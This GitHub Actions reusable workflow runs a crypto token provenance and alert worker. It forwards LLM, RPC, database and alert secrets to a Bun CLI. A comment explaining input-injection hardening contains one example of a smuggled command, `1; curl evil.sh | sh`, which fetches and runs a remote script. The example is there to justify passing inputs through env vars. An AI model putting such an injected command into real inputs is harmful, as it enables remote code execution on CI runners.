name: Run lane

# The one job both lanes run. provenance.yml (full run) and launches.yml
# (launch lane) only choose when it fires and with which inputs; every secret
# and variable the worker reads is forwarded here and nowhere else. The model
# vars (LLM_*_MODEL) take `provider:model`, so switching vendor is a repo-var
# change plus that provider's secret. With ANTHROPIC_API_KEY set every role
# runs on Claude and falls back to Kimi (blank vars) or its non-Anthropic
# LLM_*_MODEL if Anthropic fails mid-run; LLM_ANTHROPIC_FIRST=false, or no
# Anthropic key, runs the vars as set (blank = Kimi on Moonshot). A new
# provider's key is one line below.
#
# Callers pass `secrets: inherit`. GitHub never hands a job a secret the
# workflow does not name, so the list below has to stay explicit.
on:
  workflow_call:
    inputs:
      lane:
        description: 'Blank for the full run, or "launches"'
        type: string
        default: ''
      cadence_gate:
        description: 'Ask `cli.ts cadence` first and skip the run when this hour is not due'
        type: boolean
        default: false
      dry_run:
        type: boolean
        default: false
      limit:
        type: string
        default: ''
      chains:
        type: string
        default: ''
      timeout_minutes:
        type: number
        default: 45
      artifact_prefix:
        type: string
        required: true
      retention_days:
        type: number
        default: 14

jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: ${{ inputs.timeout_minutes }}
    steps:
      - uses: actions/checkout@v4

      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest

      - name: Cache Bun install
        uses: actions/cache@v4
        with:
          path: ~/.bun/install/cache
          key: bun-${{ runner.os }}-${{ hashFiles('bun.lock') }}
          restore-keys: bun-${{ runner.os }}-

      - name: Install dependencies
        run: bun install --frozen-lockfile

      # Reads stored runs only. A skipped hour costs the install above and
      # nothing else: no run row, no LLM call, no alert.
      - name: Cadence gate
        id: cadence
        if: inputs.cadence_gate
        run: bun run apps/worker/src/cli.ts cadence
        env:
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
          DATABASE_AUTH_TOKEN: ${{ secrets.DATABASE_AUTH_TOKEN }}
          CADENCE_MODE: ${{ vars.CADENCE_MODE }}
          LLM_MAX_COST_USD_PER_DAY: ${{ vars.LLM_MAX_COST_USD_PER_DAY }}

      - name: Migrate database
        if: steps.cadence.outputs.due != 'false'
        run: bun run apps/worker/src/cli.ts migrate
        env:
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
          DATABASE_AUTH_TOKEN: ${{ secrets.DATABASE_AUTH_TOKEN }}

      # Finalized chain reads (Transfer and factory log chunks) from earlier
      # runs, so a token re-analysed today only asks the node for new blocks.
      # Both lanes share one prefix: whichever ran last has the freshest set.
      # Entries expire after RPC_CACHE_MAX_AGE_HOURS (default 7 days) and the
      # directory is capped at 256 MB (packages/core/src/cache.ts).
      - name: Restore chain-read cache
        if: steps.cadence.outputs.due != 'false'
        uses: actions/cache/restore@v4
        with:
          path: data/rpc-cache
          key: rpc-cache-${{ github.run_id }}-${{ github.run_attempt }}
          restore-keys: rpc-cache-

      # Inputs reach the shell as env vars, never as `${{ }}` inside the
      # script. Interpolation happens before bash sees the line, so a `limit` of
      # `1; curl evil.sh | sh` would have been pasted in as a command. They are
      # also quoted into an array rather than word-split out of one string.
      - name: Run pipeline
        if: steps.cadence.outputs.due != 'false'
        run: |
          set -o pipefail
          args=(run)
          [ -n "$INPUT_LANE" ] && args+=(--lane "$INPUT_LANE")
          [ "$INPUT_DRY_RUN" = "true" ] && args+=(--dry-run)
          [ -n "$INPUT_LIMIT" ] && args+=(--limit "$INPUT_LIMIT")
          [ -n "$INPUT_CHAINS" ] && args+=(--chains "$INPUT_CHAINS")
          bun run apps/worker/src/cli.ts "${args[@]}" 2>&1 | tee "$RUN_LOG"
        env:
          RUN_LOG: ${{ inputs.artifact_prefix }}.log
          INPUT_LANE: ${{ inputs.lane }}
          INPUT_DRY_RUN: ${{ inputs.dry_run }}
          INPUT_LIMIT: ${{ inputs.limit }}
          INPUT_CHAINS: ${{ inputs.chains }}
          # LLM providers
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          ANTHROPIC_WORKSPACE_ID: ${{ vars.ANTHROPIC_WORKSPACE_ID }}
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
          MOONSHOT_API_KEY: ${{ secrets.MOONSHOT_API_KEY }}
          DASHSCOPE_API_KEY: ${{ secrets.DASHSCOPE_API_KEY }}
          DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
          OPENAI_COMPATIBLE_API_KEY: ${{ secrets.OPENAI_COMPATIBLE_API_KEY }}
          OPENAI_COMPATIBLE_BASE_URL: ${{ secrets.OPENAI_COMPATIBLE_BASE_URL }}
          # Models and spend
          LLM_ANTHROPIC_FIRST: ${{ vars.LLM_ANTHROPIC_FIRST }}
          LLM_MODEL: ${{ vars.LLM_MODEL }}
          LLM_EXTRACT_MODEL: ${{ vars.LLM_EXTRACT_MODEL }}
          LLM_SEARCH_MODEL: ${{ vars.LLM_SEARCH_MODEL }}
          LLM_TRIAGE_MODEL: ${{ vars.LLM_TRIAGE_MODEL }}
          LLM_PRICING: ${{ vars.LLM_PRICING }}
          # Shared by both lanes across the trailing 24 h; blank or 0 = off.
          LLM_MAX_COST_USD_PER_DAY: ${{ vars.LLM_MAX_COST_USD_PER_DAY }}
          LLM_MAX_WEB_SEARCHES: ${{ vars.LLM_MAX_WEB_SEARCHES }}
          LLM_SEARCH_BACKEND: ${{ vars.LLM_SEARCH_BACKEND }}
          # Chain data. RPC lists are comma-separated, tried in order; blank
          # keeps the public defaults in packages/core/src/config.ts. A keyed
          # URL (Helius, Alchemy) carries its key in the URL and error messages
          # quote the URL, so set those as secrets: only secrets are masked in
          # the log. A plain keyless list can stay a variable.
          ETHERSCAN_API_KEY: ${{ secrets.ETHERSCAN_API_KEY }}
          RPC_ETHEREUM: ${{ secrets.RPC_ETHEREUM || vars.RPC_ETHEREUM }}
          RPC_SOLANA: ${{ secrets.RPC_SOLANA || vars.RPC_SOLANA }}
          RPC_BASE: ${{ secrets.RPC_BASE || vars.RPC_BASE }}
          RPC_PUBLIC_FALLBACK: ${{ vars.RPC_PUBLIC_FALLBACK }}
          RPC_CACHE: ${{ vars.RPC_CACHE }}
          RPC_CACHE_MAX_AGE_HOURS: ${{ vars.RPC_CACHE_MAX_AGE_HOURS }}
          # Exa: the search tool for Kimi and other non-Anthropic models, and
          # how DexTools pairs are found (no browser)
          EXA_API_KEY: ${{ secrets.EXA_API_KEY }}
          # Social yardstick (optional; docs/social.md)
          ELFA_API_KEY: ${{ secrets.ELFA_API_KEY }}
          ELFA_MIN_INTERVAL_HOURS: ${{ vars.ELFA_MIN_INTERVAL_HOURS }}
          ELFA_MIN_MENTIONS: ${{ vars.ELFA_MIN_MENTIONS }}
          ELFA_PLATFORMS: ${{ vars.ELFA_PLATFORMS }}
          # Storage and alert delivery
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
          DATABASE_AUTH_TOKEN: ${{ secrets.DATABASE_AUTH_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
          ALERT_WEBHOOK_URL: ${{ secrets.ALERT_WEBHOOK_URL }}
          ALERT_FILE_SINK: alerts.jsonl
          # Full-run filters
          MAX_TOKENS_PER_RUN: ${{ vars.MAX_TOKENS_PER_RUN }}
          MIN_LIQUIDITY_USD: ${{ vars.MIN_LIQUIDITY_USD }}
          MIN_VOLUME_24H_USD: ${{ vars.MIN_VOLUME_24H_USD }}
          MIN_POOL_AGE_HOURS: ${{ vars.MIN_POOL_AGE_HOURS }}
          MAX_MARKET_CAP_USD: ${{ vars.MAX_MARKET_CAP_USD }}
          REANALYSE_AFTER_HOURS: ${{ vars.REANALYSE_AFTER_HOURS }}
          ALERT_SCORE_THRESHOLD: ${{ vars.ALERT_SCORE_THRESHOLD }}
          PROVENANCE_CHAINS: ${{ vars.PROVENANCE_CHAINS }}
          # Launch lane
          LAUNCHES_LOOKBACK_HOURS: ${{ vars.LAUNCHES_LOOKBACK_HOURS }}
          LAUNCHES_MAX_CATALOG_PER_RUN: ${{ vars.LAUNCHES_MAX_CATALOG_PER_RUN }}
          LAUNCHES_MIN_LIQUIDITY_USD: ${{ vars.LAUNCHES_MIN_LIQUIDITY_USD }}
          LAUNCHES_MIN_HOLDERS: ${{ vars.LAUNCHES_MIN_HOLDERS }}
          LAUNCHES_RESEARCH_ANCHORED: ${{ vars.LAUNCHES_RESEARCH_ANCHORED }}
          LOG_LEVEL: ${{ vars.LOG_LEVEL }}

      # Saved even when the run fails: the chunks it did fetch are still final.
      - name: Save chain-read cache
        if: always() && steps.cadence.outputs.due != 'false' && hashFiles('data/rpc-cache/**') != ''
        uses: actions/cache/save@v4
        with:
          path: data/rpc-cache
          key: rpc-cache-${{ github.run_id }}-${{ github.run_attempt }}

      # Uploaded even on failure: a failed run's log is the only record of why.
      - name: Upload run artifacts
        if: always() && steps.cadence.outputs.due != 'false'
        uses: actions/upload-artifact@v4
        with:
          name: ${{ inputs.artifact_prefix }}-${{ github.run_id }}
          path: |
            ${{ inputs.artifact_prefix }}.log
            alerts.jsonl
          if-no-files-found: ignore
          retention-days: ${{ inputs.retention_days }}
